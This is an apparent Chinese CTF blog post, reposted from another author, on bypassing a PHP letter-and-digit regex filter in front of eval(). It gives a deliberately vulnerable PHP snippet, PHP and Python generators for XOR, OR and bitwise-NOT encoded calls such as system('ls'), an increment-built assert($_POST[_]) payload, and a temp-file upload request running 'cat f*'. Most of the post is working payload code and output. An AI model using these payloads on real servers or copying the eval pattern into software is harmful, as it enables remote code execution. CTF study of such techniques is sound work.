@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    无字母数字绕过正则表达式总结 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-无字母数字绕过正则表达式总结"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  无字母数字绕过正则表达式总结
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/09/04/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2021-09-04T05:28:05.000Z" itemprop="datePublished">2021-09-04</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">web技术学习</a> / <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">6 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><strong>题目例子</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>我们下面以命令system(‘ls’)为例</p>
+<h2 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">		<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">		<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">	<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">	<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">	<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">		<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+
+
+<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
+<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] your function：system</span><br><span class="line">[+] your command：ls</span><br><span class="line">(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>将我们得到的结果复制过去即</p>
+<h2 id="二、或"><a href="#二、或" class="headerlink" title="二、或"></a>二、或</h2><p>原理是一样的，只需要在上面的脚本上稍加改动即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">		<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">		<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">	<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">	<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">	<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">		<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>运行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] your function：system</span><br><span class="line">[+] your command：ls</span><br><span class="line">(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、取反"><a href="#三、取反" class="headerlink" title="三、取反"></a>三、取反</h2><p>因为取反的话，基本上用的都是一个不可见字符，所有不会触发到正则表达式，我们一个php脚本就可以了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>; </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+]your function: system</span><br><span class="line">[+]your command: ls</span><br><span class="line">[*] (~%8C%86%8C%8B%9A%92)(~%93%8C);</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="四、自增"><a href="#四、自增" class="headerlink" title="四、自增"></a>四、自增</h2><p>//测试发现7.0.12以上版本不可使用<br>//使用时需要url编码下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//测试发现7.0.12以上版本不可使用</span><br><span class="line">//使用时需要url编码下</span><br><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class="line">固定格式 构造出来的 assert($_POST[_]);</span><br><span class="line">然后post传入   _=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、上传临时文件"><a href="#五、上传临时文件" class="headerlink" title="五、上传临时文件"></a>五、上传临时文件</h2><p>具体原理可以看p神文章</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">结语：</span><br><span class="line"></span><br><span class="line">除这些之外我们还可以这样用$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo其中&quot;%86%86%86%86^%d9%c1%c3%d2&quot;为构造出的_GET，适合于过滤了引号的情况下使用。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="本文全为转载yu师傅文章"><a href="#本文全为转载yu师傅文章" class="headerlink" title="本文全为转载yu师傅文章"></a>本文全为转载yu师傅文章</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/09/04/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/08/24/web%E5%85%A5%E9%97%A8%E4%B9%8Bnodejs/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">ctfshow web入门之nodejs</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
